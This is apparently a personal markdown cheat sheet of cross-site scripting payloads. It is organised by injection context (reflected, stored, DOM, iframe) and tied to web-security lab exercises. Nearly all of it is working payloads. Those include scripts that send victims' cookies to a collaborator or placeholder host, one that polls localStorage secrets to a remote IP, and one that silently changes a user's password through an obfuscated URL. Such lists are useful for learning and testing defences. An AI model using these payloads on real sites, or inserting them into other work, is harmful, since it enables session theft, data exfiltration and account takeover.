# xss payload

## demo

```javascript
<script>console.log('xss')</script>
```

```javascript
<script>alert(233)</script>
```

```javascript
<script>fetch('http://10.11.72.22/');</script>
```

## reflect

*angle brackets HTML-encoded*
```html
"onclick="alert(233)
"onfocus="alert(233)
"onmouseover="alert(233)
" autofocus onfocus=alert(document.domain) x="
```
*Breaking out of a JavaScript string*
```html
'+alert(document.domain)+'
'-alert(document.domain)-'
';alert(document.domain)//
```
*custom tags*

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

*SVG markup allowed*

```html
?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```
```html
?search="><svg><animatetransform onbegin=alert(1)>
```
*canonical link tag*

```html
/?%27accesskey=%27x%27onclick=%27alert(1)
```
```html
/?'accesskey='x'onclick='alert(1)
```
- On Windows/Linux(Chrome): `ALT+Key`
- On Windows/Linux(Firefox): `Alt+Shift+key`
- On MacOS: `CTRL+Option+X`

*JavaScript string with single quote and backslash escaped*

```html
</script><img src=1 onerror=alert("233")>
```
```html
</script><script>alert(1)</script>
```
```html
\'-alert(2333)//
```
*JavaScript template literals*
```html
${alert(document.domain)}
```

## stored

*anchor href attribute with double quotes HTML-encoded*

```html
<a href="javascript:alert(document.domain)">
```

*`onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped, `&apos;`*

```html
&apos;-alert(2333)-&apos;
```

## DOM

*`location.search` source &  `document.write` sink*
```html
"><img src=1 onerror=alert(document.domain)>
```
```javascript
"><script>alert(document.domain)</script>
" onload="alert(1)
"><svg onload=alert(1)>
```

*`location.search` source & `innerHTML` sink*

```html
"><img src=1 onerror=alert(document.domain)>
"><svg><animate onend=alert(233) attributeName=x dur=1s>
"><audio src/onerror=alert(233)>
```

*`location.search` source & jQuery anchor `href` attribute sink*
`<a id="backLink" href="javascript:alert(233)">Back</a>`
```html
javascript:alert(233)
```

*AngularJS expression with angle brackets and double quotes HTML-encoded*
```html
{{$on.constructor('alert(1)')()}}
```   

*Reflected DOM XSS*
```html
\"-alert(123)}//
```

*Stored DOM XSS*
```html
<><img src=x onerror=alert(233)>
``` 
## iframe

[`<iframe>`](../cyber/web.md#iframe)（Inline Frame，内联框架）是 HTML 中非常强大但也伴随安全争议的一个标签。

*reflected XSS vulnerability in the search functionality*
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

*jQuery selector sink using a hashchange event*
```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

## cookies

```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
```javascript
<script>fetch('https://xxx/?'+btoa(document.cookie));</script>
```
```javascript
<script>window.location='https://xxx/?'+document.cookie;</script>
```

```javascript
<img src=x onerror="window.location='https://xxx/?'+document.cookie;"/>
```

---

## change password

```javascript
<script>fetch('/change_password.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:"new_password=admin123"});</script>
```
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
alert("Action executed!");
}
};
xhr.send('action=execute&new_password=admin123');
</script>
```
---

## DOM getItem

```javascript
<img src="x" onerror="setInterval(function() {fetch('http://10.10.158.224:4242?secret=' + encodeURIComponent(localStorage.getItem('secret'))).then(response => {})},2000);">
```
---